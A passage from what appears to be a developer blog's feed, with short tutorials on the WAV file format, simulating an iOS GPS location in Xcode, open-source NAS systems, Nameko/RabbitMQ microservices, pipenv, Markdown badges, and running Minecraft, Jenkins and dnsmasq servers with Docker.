class="table-container"><table><thead><tr><th>名称</th><th>偏移地址</th><th>字节数</th><th>端序</th><th>内容</th></tr></thead><tbody><tr><td>ID</td><td>0x00</td><td>4Byte</td><td>大端</td><td>‘RIFF’ (0x52494646)</td></tr><tr><td>Size</td><td>0x04</td><td>4Byte</td><td>小端</td><td>fileSize - 8</td></tr><tr><td>Type</td><td>0x08</td><td>4Byte</td><td>大端</td><td>‘WAVE’(0x57415645)</td></tr></tbody></table></div><pre><code class="lang-text">ID 以&#39;RIFF&#39;为标识Size 是整个文件的长度减去 ID 和 Size 的长度Type 是WAVE表示后面需要两个子块：Format 区块和 Data 区块</code></pre><h3 id="FORMAT区块"><a href="#FORMAT区块" class="headerlink" title="FORMAT区块"></a>FORMAT区块</h3><div class="table-container"><table><thead><tr><th>名称</th><th>偏移地址</th><th>字节数</th><th>端序</th><th>内容</th></tr></thead><tbody><tr><td>ID</td><td>0x00</td><td>4Byte</td><td>大端</td><td>‘fmt ‘ (0x666D7420)</td></tr><tr><td>Size</td><td>0x04</td><td>4Byte</td><td>小端</td><td>16</td></tr><tr><td>AudioFormat</td><td>0x08</td><td>2Byte</td><td>小端</td><td>音频格式</td></tr><tr><td>NumChannels</td><td>0x0A</td><td>2Byte</td><td>小端</td><td>声道数</td></tr><tr><td>SampleRate</td><td>0x0C</td><td>4Byte</td><td>小端</td><td>采样率</td></tr><tr><td>ByteRate</td><td>0x10</td><td>4Byte</td><td>小端</td><td>每秒数据字节数</td></tr><tr><td>BlockAlign</td><td>0x14</td><td>2Byte</td><td>小端</td><td>数据块对齐</td></tr><tr><td>BitsPerSample</td><td>0x16</td><td>2Byte</td><td>小端</td><td>采样位数</td></tr></tbody></table></div><pre><code class="lang-text">ID 以&#39;fmt &#39;为标识Size 表示该区块数据的长度（不包含 ID 和 Size 的长度）AudioFormat 表示 Data 区块存储的音频数据的格式，PCM音频数据的值为1NumChannels 表示音频数据的声道数，1：单声道，2：双声道SampleRate 表示音频数据的采样率ByteRate 每秒数据字节数 = SampleRate * NumChannels * BitsPerSample / 8BlockAlign 每个采样所需的字节数 = NumChannels * BitsPerSample / 8BitsPerSample 每个采样存储的bit数，8：8bit，16：16bit，32：32bit</code></pre><h3 id="DATA区块"><a href="#DATA区块" class="headerlink" title="DATA区块"></a>DATA区块</h3><div class="table-container"><table><thead><tr><th>名称</th><th>偏移地址</th><th>字节数</th><th>端序</th><th>内容</th></tr></thead><tbody><tr><td>ID</td><td>0x00</td><td>4Byte</td><td>大端</td><td>‘data’ (0x64617461)</td></tr><tr><td>Size</td><td>0x04</td><td>4Byte</td><td>小端</td><td>N</td></tr><tr><td>Data</td><td>0x08</td><td>NByte</td><td>小端</td><td>音频数据</td></tr></tbody></table></div><pre><code class="lang-text">ID 以&#39;data&#39;为标识Size 表示音频数据的长度，N = ByteRate * secondsData 音频数据</code></pre><h2 id="小端存储"><a href="#小端存储" class="headerlink" title="小端存储"></a>小端存储</h2><blockquote><p>所谓的大端模式，是指数据的低位保存在内存的高地址中，而数据的高位，保存在内存的低地址中；<br>所谓的小端模式，是指数据的低位保存在内存的低地址中，而数据的高位保存在内存的高地址中。</p></blockquote><p>下面解释一下 PCM 数据在 WAV 文件中的 bit 位排列方式</p><div class="table-container"><table><thead><tr><th>PCM数据类型</th><th>采样</th><th>采样</th></tr></thead><tbody><tr><td>8Bit 单声道</td><td>声道0</td><td>声道0</td></tr><tr><td>8Bit 双声道</td><td>声道0</td><td>声道1</td></tr><tr><td>16Bit 单声道</td><td>声道0低位，声道0高位</td><td>声道0低位，声道0高位</td></tr><tr><td>16Bit 双声道</td><td>声道0低位，声道0高位</td><td>声道1低位，声道1高位</td></tr></tbody></table></div><h2 id="示例代码-C"><a href="#示例代码-C" class="headerlink" title="示例代码 (C)"></a>示例代码 (C)</h2><pre><code class="lang-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;struct WAV_Format {    // riff header    uint32_t ChunkID;        // &quot;RIFF&quot;    uint32_t ChunkSize;      // 36 + Subchunk2Size    uint32_t Format;         // &quot;WAVE&quot;    // sub-chunk &quot;fmt&quot;    uint32_t Subchunk1ID;    // &quot;fmt &quot; */    uint32_t Subchunk1Size;  // 16 for PCM */    uint16_t AudioFormat;    // PCM = 1*/    uint16_t NumChannels;    // Mono = 1, Stereo = 2, etc.    uint32_t SampleRate;     // 8000, 44100, etc.    uint32_t ByteRate;       // = SampleRate * NumChannels * BitsPerSample/8    uint16_t BlockAlign;     // = NumChannels * BitsPerSample/8    uint16_t BitsPerSample;  // 8bits, 16bits, etc.    // sub-chunk &quot;data&quot;    uint32_t Subchunk2ID;    // &quot;data&quot;    uint32_t Subchunk2Size;  // data size};int main(void) {    FILE *fp = NULL;    struct WAV_Format wav;    fp = fopen(&quot;output_1.wav&quot;, &quot;rb&quot;);    if (!fp) {        printf(&quot;can&#39;t open audio file\n&quot;);        exit(1);    }    fread(&amp;wav, 1, sizeof(struct WAV_Format), fp);    printf(&quot;ChunkID \t%x\n&quot;, wav.ChunkID);    printf(&quot;ChunkSize \t%d\n&quot;, wav.ChunkSize);    printf(&quot;Format \t\t%x\n&quot;, wav.Format);    printf(&quot;Subchunk1ID \t%x\n&quot;, wav.Subchunk1ID);    printf(&quot;Subchunk1Size \t%d\n&quot;, wav.Subchunk1Size);    printf(&quot;AudioFormat \t%d\n&quot;, wav.AudioFormat);    printf(&quot;NumChannels \t%d\n&quot;, wav.NumChannels);    printf(&quot;SampleRate \t%d\n&quot;, wav.SampleRate);    printf(&quot;ByteRate \t%d\n&quot;, wav.ByteRate);    printf(&quot;BlockAlign \t%d\n&quot;, wav.BlockAlign);    printf(&quot;BitsPerSample \t%d\n&quot;, wav.BitsPerSample);    printf(&quot;Subchunk2ID \t%x\n&quot;, wav.Subchunk2ID);    printf(&quot;Subchunk2Size \t%d\n&quot;, wav.Subchunk2Size);    fclose(fp);    return 0;}</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://www.jianshu.com/p/947528f3dff8" target="_blank" rel="noopener">WAV文件格式详解 - 简书</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Audio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to Fake a GPS Location on IOS</title>
      <link href="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/"/>
      <url>/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p><code>IPhone X</code><br><code>System: IOS 12.2</code></p><p><code>MacBook Pro 2018</code><br><code>System: macOS Mojave 10.14.4</code><br><code>IDE: Xcode v10.2</code></p><h2 id="Quick-Guide"><a href="#Quick-Guide" class="headerlink" title="Quick Guide"></a>Quick Guide</h2><h3 id="Create-Project"><a href="#Create-Project" class="headerlink" title="Create Project"></a>Create Project</h3><p>Open your Xcode and Create a new <span class="highlight">Single View App</span> project.</p><img src="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/create_project.png"><h3 id="Get-GPS-Location"><a href="#Get-GPS-Location" class="headerlink" title="Get GPS Location"></a>Get GPS Location</h3><p><a href="http://www.gpsspg.com/maps.htm" target="_blank" rel="noopener">http://www.gpsspg.com/maps.htm</a></p><p>Demo: 清华大学 (40.0033348446,116.3261745921)</p><img src="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/gps.png"><h3 id="Add-a-gpx-file"><a href="#Add-a-gpx-file" class="headerlink" title="Add a gpx file"></a>Add a gpx file</h3><p>Replace the latitude and longitude of the location you choose</p><img src="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/add_gpx.png"><pre><code class="lang-xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;gpx version=&quot;1.1&quot; creator=&quot;Xcode&quot;&gt;    &lt;wpt lat=&quot;40.0033348446&quot; lon=&quot;116.326174592&quot;&gt;        &lt;name&gt;清华大学&lt;/name&gt;        &lt;time&gt;2014-09-24T14:55:37Z&lt;/time&gt;    &lt;/wpt&gt;&lt;/gpx&gt;</code></pre><h3 id="Edit-Scheme"><a href="#Edit-Scheme" class="headerlink" title="Edit Scheme"></a>Edit Scheme</h3><p>Choose Your Project &gt; Edit Scheme &gt; Options<br>Check <span class="highlight">Allow Location Simulation</span> and set <span class="highlight">Default Location</span> to your gpx file</p><img src="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/edit_scheme.png"><h3 id="Connect-IPhone-and-Run-Debug"><a href="#Connect-IPhone-and-Run-Debug" class="headerlink" title="Connect IPhone and Run Debug"></a>Connect IPhone and Run Debug</h3><p>Perfect!</p><img src="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/phone.png">]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A list of Open Source NAS Operating System</title>
      <link href="/2019/05/02/027_A_list_of_Open_Source_NAS_Operating_System/"/>
      <url>/2019/05/02/027_A_list_of_Open_Source_NAS_Operating_System/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="FreeNAS"><a href="#FreeNAS" class="headerlink" title="FreeNAS"></a><a href="http://www.freenas.org" target="_blank" rel="noopener">FreeNAS</a></h2><p>目前最受欢迎的开源免费 NAS 操作系统之一，基于以安全和稳定著称的 FreeBSD 系统开发，由 ixsystems 公司的技术团队维护。</p><img src="/2019/05/02/027_A_list_of_Open_Source_NAS_Operating_System/Freenas.png"><h2 id="NAS4Free"><a href="#NAS4Free" class="headerlink" title="NAS4Free"></a><a href="http://www.nas4free.org" target="_blank" rel="noopener">NAS4Free</a></h2><p>基于 FreeNAS 0.7 开发的一个分支，由原 FreeNAS 系统开发者发起创建。许多恋旧的朋友忠实的跟随，安装要求没有 FreeNAS 高，版本更新也很及时。</p><img src="/2019/05/02/027_A_list_of_Open_Source_NAS_Operating_System/nas4free.jpg"><h2 id="OpenMediaVault"><a href="#OpenMediaVault" class="headerlink" title="OpenMediaVault"></a><a href="http://www.openmediavault.org/" target="_blank" rel="noopener">OpenMediaVault</a></h2><p>由原 FreeNAS 核心开发成员 Volker Theile 发起的基于 Debian Linux 的开源 NAS 操作系统，主要面向家庭用户和小型办公环境，最近发布了针对树莓派的安装包，值得关注。</p><img src="/2019/05/02/027_A_list_of_Open_Source_NAS_Operating_System/openmediavault.png"><h2 id="Openfiler"><a href="#Openfiler" class="headerlink" title="Openfiler"></a><a href="http://www.openfiler.com/" target="_blank" rel="noopener">Openfiler</a></h2><p>另一款基于浏览器管理的开源 NAS 操作系统，许多人说他好用，因为它基于 rPath Linux 开发。2013年以后，这款 NAS 系统的开源版本再没有更新。</p><img src="/2019/05/02/027_A_list_of_Open_Source_NAS_Operating_System/openfiler.jpg"><h2 id="NexentaStor"><a href="#NexentaStor" class="headerlink" title="NexentaStor"></a><a href="http://www.nexentastor.org/" target="_blank" rel="noopener">NexentaStor</a></h2><p>基于 OpenSolaris 开发，与 FreeNAS 一样采用强大的 ZFS 文件系统。该系统由 Nexenta Systems 公司技术团队维护，同时提供社区开原版和商业付费版本，社区开原版有 18TB 的存储容量限制，有人说 NexentaStor 比 OpenFiler 好用。</p><img src="/2019/05/02/027_A_list_of_Open_Source_NAS_Operating_System/nexentastor.jpg"><h2 id="RockStor"><a href="#RockStor" class="headerlink" title="RockStor"></a><a href="http://www.rockstor.com/" target="_blank" rel="noopener">RockStor</a></h2><p>一款基于 Linux 的开源 NAS 系统，采用企业级文件系统 BTRFS，提供 SMB/CIFS、NFS 以及 SFTP 常见的共享方式。第一个 ISO 镜像发布于 2014-10-02，可见这套 NAS 系统初出茅庐，暂无简体中文支持。不过官网文档已经备齐，保持关注，可能有一番作为。</p><img src="/2019/05/02/027_A_list_of_Open_Source_NAS_Operating_System/rockstor.jpg"><h2 id="EasyNAS"><a href="#EasyNAS" class="headerlink" title="EasyNAS"></a><a href="http://www.easynas.org/" target="_blank" rel="noopener">EasyNAS</a></h2><p>另一款非常年轻的 NAS 系统，与 RockStor 很像，同样采用企业级文件系统 BTRFS，但官方网站和文档会略逊一筹，第一个 ISO 镜像发布于 2014-05-10。</p><img src="/2019/05/02/027_A_list_of_Open_Source_NAS_Operating_System/EasyNAS.jpg"><h2 id="Webmin"><a href="#Webmin" class="headerlink" title="Webmin"></a><a href="http://www.webmin.cn/" target="_blank" rel="noopener">Webmin</a></h2><p>它不是 NAS 操作系统，但可以实现基本的 samba 共享功能，webmin 是目前功能最强大的基于浏览器的 Unix 系统管理工具。可以安装在几乎所有的类 Unix 操作系统上面。特别适合刚入门的用户管理 Linux 服务器。</p><img src="/2019/05/02/027_A_list_of_Open_Source_NAS_Operating_System/Webmin.png"><h2 id="GlusterFS"><a href="#GlusterFS" class="headerlink" title="GlusterFS"></a><a href="http://www.gluster.org/" target="_blank" rel="noopener">GlusterFS</a></h2><p>由 Z RESEARCH 公司负责开发，最近非常活跃。 文档也比较齐全，不难上手。GlusterFS 通过 Infiniband RDMA 或 TCP/IP 协议将多台廉价的 x86 主机，通过网络互联成一个并行的网络文件系统。据说 Gluster 已被 RedHat 收购。</p><h2 id="Lustre"><a href="#Lustre" class="headerlink" title="Lustre"></a><a href="http://lustre.org/" target="_blank" rel="noopener">Lustre</a></h2><p>为解决海量存储问题而设计的全新文件系统。是下一代的集群文件系统，可支持10,000个节点，PB的存储量，100GB/S的传输速度，完美的安全性和可管理性。 目前Lustre已经运用在一些领域，例如HP SFS产品等。</p>]]></content>
      
      
      <categories>
          
          <category> Solutions </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NAS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use Nameko + RabbitMQ to establish your Microservice</title>
      <link href="/2019/04/24/026_Use_Nameko_and_RabbitMQ_to_establish_your_Microservices/"/>
      <url>/2019/04/24/026_Use_Nameko_and_RabbitMQ_to_establish_your_Microservices/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>Nameko is a microservices framework for Python that lets service developers concentrate on application logic and encourages testability.</p></blockquote><img src="/2019/04/24/026_Use_Nameko_and_RabbitMQ_to_establish_your_Microservices/nameko.png"><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><p>According to official documentation:</p><blockquote><p>It comes with built-in support for:</p><ul><li>RPC over AMQP</li><li>Asynchronous events (pub-sub) over AMQP</li><li>Simple HTTP GET and POST</li><li>Websocket RPC and subscriptions (experimental)</li></ul></blockquote><p>As I know, It can also respond to grpc requests by using <a href="https://github.com/nameko/nameko-grpc" target="_blank" rel="noopener">nameko-grpc</a> extension.</p><h2 id="Quick-Guide"><a href="#Quick-Guide" class="headerlink" title="Quick Guide"></a>Quick Guide</h2><h3 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h3><p>Nameko use RabbitMQ as a message-oriented middleware. We can easily create a rabbitmq environment by docker. You can read my previous post <a href="/2018/12/09/003%20RabbitMQ%20Installation/"><code>《RabbitMQ Installation》</code></a> for more details.</p><pre><code class="lang-yaml"># docker-compose.ymlversion: &quot;2&quot;services:  bitbucket:    image: &quot;rabbitmq:management&quot;    container_name: rabbitmq    restart: always    ports:      - &quot;5672:5672&quot;      - &quot;15672:15672&quot;</code></pre><p>OR:</p><pre><code class="lang-bash">$ docker run -d --name rabbitmq \-p 15672:15672 -p 5672:5672 \rabbitmq:3-management</code></pre><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><p>Here I use pipenv to install nameko. Pipenv is a package manager for python. You can read my last post <a href="/2019/04/13/025%20Pipenv%20Tutorial/"><code>《 Pipenv Tutorial 》</code></a> about its feature, advantages and usage.</p><pre><code class="lang-$xslt">$ pipenv install nameko</code></pre><h3 id="Create-a-Service"><a href="#Create-a-Service" class="headerlink" title="Create a Service"></a>Create a Service</h3><pre><code class="lang-python"># myservice.py# -*- coding: UTF-8 -*-import osimport gensimimport numpy as npimport jiebafrom scipy.linalg import normfrom nameko.rpc import rpcBASE_DIR = os.path.abspath(os.path.dirname(__file__))MODEL_PATH = os.path.join(BASE_DIR, &quot;data/news_12g_baidubaike_20g_novel_90g_embedding_64.bin&quot;)model = gensim.models.KeyedVectors.load_word2vec_format(MODEL_PATH, binary=True)def get_sentence_vector(s):    words = jieba.lcut(s)    sentence_vector = np.zeros(64)    word_num = 0    for word in words:        try:            word_vec = model.get_vector(word)            sentence_vector += word_vec            word_num += 1        except KeyError:            pass    sentence_vector /= word_num    return sentence_vectordef get_sentence_similarity(s1, s2):    v1, v2 = get_sentence_vector(s1), get_sentence_vector(s2)    return np.dot(v1, v2) / (norm(v1) * norm(v2))class RPCService:    name = &quot;sentence_similarity&quot;    @rpc    def compute(self, s1, s2):        return get_sentence_similarity(s1, s2)</code></pre><p>It’s a service to calculate the similarity of sentence in Chinese. You can just ignore the implementation of the compute function and focus on the service part.</p><pre><code class="lang-python">class RPCService:    name = &quot;sentence_similarity&quot;    @rpc    def compute(self, s1, s2):        return get_sentence_similarity(s1, s2)</code></pre><p>It’s really concise, isn’t it? All you need to do is define the service name and add a rpc decorator to your method. You don’t have to care about how to communicate to your broker and how to serialize or deserialize your data. You don’t even need to define your data structure like protobuf and grpc do.</p><h3 id="Start-your-service"><a href="#Start-your-service" class="headerlink" title="Start your service"></a>Start your service</h3><pre><code class="lang-bash">$ nameko run [service_name] --broker [broker_uri]</code></pre><p>For this case</p><pre><code class="lang-bash">$ nameko run service --broker amqp://guest:guest@localhost:5672# 5672 is the default amqp port for rabbitmq&quot;&quot;&quot; Returnsstarting services: sentence_similarityConnected to amqp://guest:**@127.0.0.1:5672//&quot;&quot;&quot;</code></pre><h3 id="How-to-Invoke-Client"><a href="#How-to-Invoke-Client" class="headerlink" title="How to Invoke? (Client)"></a>How to Invoke? (Client)</h3><p>You can easily test your service by nameko shell</p><pre><code class="lang-bash">$ nameko shell --broker amqp://guest:guest@localhost:5672Nameko Python 3.7.1 (default, Apr 23 2019, 06:16:09) [Clang 10.0.0 (clang-1000.11.45.5)] shell on darwinBroker: amqp://guest:guest@localhost:5672&gt;&gt;&gt; n.rpc.sentence_similarity.compute(&quot;晚上吃了么&quot;, &quot;今晚吃了什么&quot;)0.8222975682337561&gt;&gt;&gt; n.rpc.sentence_similarity.compute(&quot;晚上吃了么&quot;, &quot;今天天气不错&quot;)0.2270335911019851</code></pre><p>You can also invoke your service by ClusterRpcProxy without any data structure definition and it looks like a synchronous method. It also has asynchronous calling methods.</p><pre><code class="lang-python">from nameko.standalone.rpc import ClusterRpcProxybroker_cfg = {&#39;AMQP_URI&#39;: &quot;amqp://guest:guest@localhost&quot;}def get_sentence_similarity(s1, s2):    with ClusterRpcProxy(broker_cfg) as rpc:        result = rpc.sentence_similarity.compute(s1, s2)        return resultif __name__ == &quot;__main__&quot;:    print(get_sentence_similarity(&quot;今天吃了么&quot;, &quot;今天吃什么&quot;))</code></pre><h2 id="Other-Protocols-support"><a href="#Other-Protocols-support" class="headerlink" title="Other Protocols support"></a>Other Protocols support</h2><p>It also supports http protocol.</p><pre><code class="lang-python"># http_service.py# -*- coding: UTF-8 -*-import jsonfrom nameko.web.handlers import httpclass HttpService:    name = &quot;http_service&quot;    @http(&#39;GET&#39;, &#39;/get/&lt;int:value&gt;&#39;)    def get_method(self, request, value):        return json.dumps({&#39;value&#39;: value})    @http(&#39;POST&#39;, &#39;/post&#39;)    def do_post(self, request):        return u&quot;received: {}&quot;.format(request.get_data(as_text=True))</code></pre><p>Or grpc, <a href="https://github.com/nameko/nameko-grpc" target="_blank" rel="noopener">nameko-grpc</a>. Just read the docs.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://www.nameko.io/" target="_blank" rel="noopener">Nameko official website</a><br>[2] <a href="https://docs.nameko.io/en/stable/" target="_blank" rel="noopener">Nameko 2.11.0 documentation</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> RPC </tag>
            
            <tag> Microservice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pipenv Tutorial</title>
      <link href="/2019/04/13/025_Pipenv_Tutorial/"/>
      <url>/2019/04/13/025_Pipenv_Tutorial/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>Like npm, pipenv is the officially recommended Python packaging tool from Python.org.</p></blockquote><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><h3 id="For-MacOS"><a href="#For-MacOS" class="headerlink" title="For MacOS"></a>For MacOS</h3><pre><code class="lang-bash">$ brew install pipenv$ echo &#39;export PIPENV_VENV_IN_PROJECT=1&#39; &gt;&gt; ~/.zshrc# or ~/.basrc depends on your shell</code></pre><h3 id="For-Ubuntu"><a href="#For-Ubuntu" class="headerlink" title="For Ubuntu"></a>For Ubuntu</h3><pre><code class="lang-bash">$ sudo apt install pipenv$ echo &#39;export PIPENV_VENV_IN_PROJECT=1&#39; &gt;&gt; ~/.zshrc</code></pre><h2 id="Quick-guide"><a href="#Quick-guide" class="headerlink" title="Quick guide"></a>Quick guide</h2><h3 id="Create-virtual-environment"><a href="#Create-virtual-environment" class="headerlink" title="Create virtual environment"></a>Create virtual environment</h3><pre><code class="lang-bash"># for python3$ pipenv --three# for python2$ pipenv --two</code></pre><img src="/2019/04/13/025_Pipenv_Tutorial/create_virtualenv.gif"><h3 id="Enter-virtual-environment"><a href="#Enter-virtual-environment" class="headerlink" title="Enter virtual environment"></a>Enter virtual environment</h3><pre><code class="lang-bash">$ pipenv shell</code></pre><p>It’s the same as ‘source venv/bin/active’</p><h3 id="Install-packages"><a href="#Install-packages" class="headerlink" title="Install packages"></a>Install packages</h3><pre><code class="lang-bash">$ pipenv install flask numpy$ pipenv install pytest --dev</code></pre><img src="/2019/04/13/025_Pipenv_Tutorial/install.gif"><h3 id="Check-out-packge"><a href="#Check-out-packge" class="headerlink" title="Check out packge"></a>Check out packge</h3><pre><code class="lang-bash">$ pipenv graph</code></pre><img src="/2019/04/13/025_Pipenv_Tutorial/graph.png"><p>It’s like ‘pip list’ but more friendly</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://pipenv.readthedocs.io/en/latest/" target="_blank" rel="noopener">Pipenv: Python Dev Workflow for Humans</a></p>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Add bandages to your markdown</title>
      <link href="/2019/04/10/024_Add_bandages_to_your_markdown/"/>
      <url>/2019/04/10/024_Add_bandages_to_your_markdown/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>Do you know how to add these remarkable bandages to your markdown?</p></blockquote><p><embed src="https://img.shields.io/badge/version-v0.1.2-brightgreen.svg">&nbsp;<embed src="https://img.shields.io/badge/author-vincent-lightgrey.svg">&nbsp;<embed src="https://img.shields.io/badge/license-MIT-green.svg">&nbsp;<embed src="https://img.shields.io/badge/python-3.6%20%7C%203.7-blue.svg"></p><h2 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h2><p>You can easily create a bandage by the following code</p><pre><code class="lang-text">![](https://img.shields.io/badge/{label}-{message}-{color}.svg)&#39;&#39;&#39;Parameters:  label: string  message: string  color: optional    - &quot;brightgreen&quot;    - &quot;green&quot;    - &quot;yellowgreen&quot;    - &quot;yellow&quot;    - &quot;orange&quot;    - &quot;red&quot;    - &quot;lightgrey&quot;    - &quot;blue&quot;&#39;&#39;&#39;</code></pre><p>Here is the demo</p><pre><code class="lang-markdown">![](https://img.shields.io/badge/hello-vincent-orange.svg)</code></pre><embed src="https://img.shields.io/badge/hello-vincent-orange.svg"><h2 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h2><p>You can also optimise styles or create a dynamic bandage by json/xml/yaml endpoint. Here is the official tutorial.</p><p><a href="https://shields.io/" target="_blank" rel="noopener">https://shields.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deploy a minecraft server using forge</title>
      <link href="/2019/04/03/023_Deploy_a_minecraft_server_using_forge/"/>
      <url>/2019/04/03/023_Deploy_a_minecraft_server_using_forge/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>Here I use v1.12.2 for demonstration. You can choose any version you like.</p></blockquote><h2 id="Download-Forge-Installer"><a href="#Download-Forge-Installer" class="headerlink" title="Download Forge Installer"></a>Download Forge Installer</h2><p><a href="https://files.minecraftforge.net/maven/net/minecraftforge/forge/index_1.12.2.html" target="_blank" rel="noopener">https://files.minecraftforge.net/maven/net/minecraftforge/forge/index_1.12.2.html</a><br><img src="/2019/04/03/023_Deploy_a_minecraft_server_using_forge/download_forge.png"></p><h2 id="Install-Server"><a href="#Install-Server" class="headerlink" title="Install Server"></a>Install Server</h2><pre><code class="lang-bash">$ java -jar forge-1.12.2-14.23.5.2768-installer.jar nogui --installServer</code></pre><p>You can delete ‘forge-1.12.2-14.23.5.2768-installer.jar’ after installation</p><h2 id="Run-Server"><a href="#Run-Server" class="headerlink" title="Run Server"></a>Run Server</h2><pre><code class="lang-bash">$ java -Xms2G -Xmx2G -server -jar forge-1.12.2-14.23.5.2768-universal.jar nogui&#39;&#39;&#39;options:  -Xmx: maximum memory  -Xms: minimum memory&#39;&#39;&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Install and upgrade Jenkins with Docker</title>
      <link href="/2019/03/11/022_Install_and_upgrade_Jenkins_with_Docker/"/>
      <url>/2019/03/11/022_Install_and_upgrade_Jenkins_with_Docker/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><pre><code class="lang-bash">$ docker pull jenkins$ docker run -d -p 8080:8080 -p 50000:50000 --name jenkins --restart=always jenkins</code></pre><h2 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h2><pre><code class="lang-bash"># check version$ docker exec -it jenkins java -jar /usr/share/jenkins/jenkins.war --version# download latest jenkins.war from http://updates.jenkins-ci.org/download/war/$ wget http://updates.jenkins-ci.org/download/war/2.167/jenkins.war# replace file$ sudo docker cp jenkins.war jenkins:/usr/share/jenkins/</code></pre><h2 id="Change-Context-to-jenkins"><a href="#Change-Context-to-jenkins" class="headerlink" title="Change Context to /jenkins"></a>Change Context to /jenkins</h2><pre><code class="lang-bash"># edit /usr/local/bin/jenkins.sh# find line &quot;java -jar ...&quot; and replace: java -jar /usr/share/jenkins/jenkins.war --prefix=/jenkins</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://mohitgoyal.co/2017/02/15/upgrade-jenkins-server-to-a-new-version/" target="_blank" rel="noopener">Upgrade Jenkins server to a new version</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Jenkins </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deploy dnsmasq with docker</title>
      <link href="/2019/03/04/021_Deploy_dnsmasq_with_docker/"/>
      <url>/2019/03/04/021_Deploy_dnsmasq_with_docker/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h2><pre><code class="lang-bash">$ git clone https://github.com/Vincent0700/dns-server.git$ cd dns-server$ docker-compose up --build -d</code></pre><h2 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h2><ul><li>conf/dnsmasq.conf: base config file</li><li>conf/hosts: domain mapping</li><li>conf/resolv.conf: upstream dns server</li></ul><h2 id="Flush-dns"><a href="#Flush-dns" class="headerlink" title="Flush dns"></a>Flush dns</h2><pre><code class="lang-bash">$ docker restart dnsmasq</code></pre>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> DNS </tag>
            
        </tags>
